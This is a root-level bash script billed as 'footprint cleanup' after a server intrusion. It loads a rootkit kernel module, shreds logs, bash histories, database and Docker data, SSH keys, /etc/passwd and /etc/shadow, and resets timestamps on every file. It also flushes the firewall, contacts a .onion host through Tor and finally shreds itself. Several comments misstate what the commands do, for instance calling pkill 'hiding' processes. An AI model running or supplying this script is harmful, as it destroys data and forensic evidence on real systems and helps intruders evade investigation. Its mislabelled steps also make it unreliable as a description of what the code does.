#!/bin/bash

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo "[!] This script must be run with ROOT privileges."
    exit 1
fi

echo "[*] Starting advanced footprint cleanup on the server..."

# -------------------------
# Kernel Injection
# -------------------------
kernel_injection() {
    echo "[*] Starting rootkit injection into the kernel..."
    # Load a custom rootkit (you need to have the custom code here)
    modprobe custom_rootkit
    echo "[✔] Rootkit injected into the kernel successfully."
}

# -------------------------
# Hide Processes
# -------------------------
hide_processes() {
    echo "[*] Hiding suspicious processes..."
    processes=("ssh" "nc" "python" "bash" "perl" "ruby" "wget" "curl")
    for proc in "${processes[@]}"; do
        pkill -f "$proc" &>/dev/null
    done
    echo "[✔] Suspicious processes hidden successfully."
}

# -------------------------
# Delete Logs
# -------------------------
delete_logs() {
    echo "[*] Deleting logs..."
    log_dirs=(
        "/var/log"
        "/tmp"
        "/var/tmp"
        "/root/.bash_history"
        "/home/*/.bash_history"
        "/var/lib/mysql"
        "/var/lib/docker"
    )
    for dir in "${log_dirs[@]}"; do
        if [ -d "$dir" ]; then
            find "$dir" -type f -exec shred -u -z {} \; &>/dev/null
            echo "[✔] Logs deleted in: $dir"
        fi
    done
}

# -------------------------
# Modify Timestamps for All Files
# -------------------------
modify_timestamps() {
    echo "[*] Modifying timestamps for all files..."
    find / -type f -exec touch -t $(date +%Y%m%d%H%M) {} \; &>/dev/null
    echo "[✔] Timestamps modified successfully."
}

# -------------------------
# Reset Network and Firewall Settings
# -------------------------
reset_network() {
    echo "[*] Resetting network and firewall settings..."
    iptables -F &>/dev/null
    iptables -X &>/dev/null
    iptables -t nat -F &>/dev/null
    iptables -t nat -X &>/dev/null
    ufw disable &>/dev/null
    echo "[✔] Network and firewall reset successfully."
}

# -------------------------
# Encrypt Traffic via Network
# -------------------------
tunnel_traffic() {
    echo "[*] Encrypting network traffic..."
    torify curl -s http://hiddenservice.onion
    echo "[✔] Traffic encrypted successfully."
}

# -------------------------
# Hide the Script Itself
# -------------------------
self_destruct() {
    echo "[*] Hiding the script..."
    shred -u -z "$0" &>/dev/null
    echo "[✔] Script hidden successfully."
}

# -------------------------
# Delete Suspicious Users
# -------------------------
delete_users() {
    echo "[*] Deleting suspicious users..."
    users=("test" "backdoor" "hacker")
    for user in "${users[@]}"; do
        deluser --remove-home "$user" &>/dev/null
    done
    echo "[✔] Suspicious users deleted successfully."
}

# -------------------------
# Delete SSH Keys and Authentication Files
# -------------------------
delete_ssh_keys() {
    echo "[*] Deleting SSH keys..."
    find /root/.ssh /home/*/.ssh /etc/ssh/ -type f -exec shred -u -z {} \; &>/dev/null
    echo "[✔] SSH keys deleted successfully."
}

# -------------------------
# Delete Sensitive Files
# -------------------------
delete_sensitive_files() {
    echo "[*] Deleting sensitive files..."
    sensitive_files=(
        "/etc/passwd"
        "/etc/shadow"
        "/etc/hosts"
        "/etc/hostname"
        "/etc/network/interfaces"
    )
    for file in "${sensitive_files[@]}"; do
        shred -u -z "$file" &>/dev/null
    done
    echo "[✔] Sensitive files deleted successfully."
}

# -------------------------
# Execute all functions
# -------------------------
kernel_injection
hide_processes
delete_logs
modify_timestamps
reset_network
tunnel_traffic
delete_users
delete_ssh_keys
delete_sensitive_files
self_destruct

echo "[✔] All footprints cleaned successfully!"
exit 0
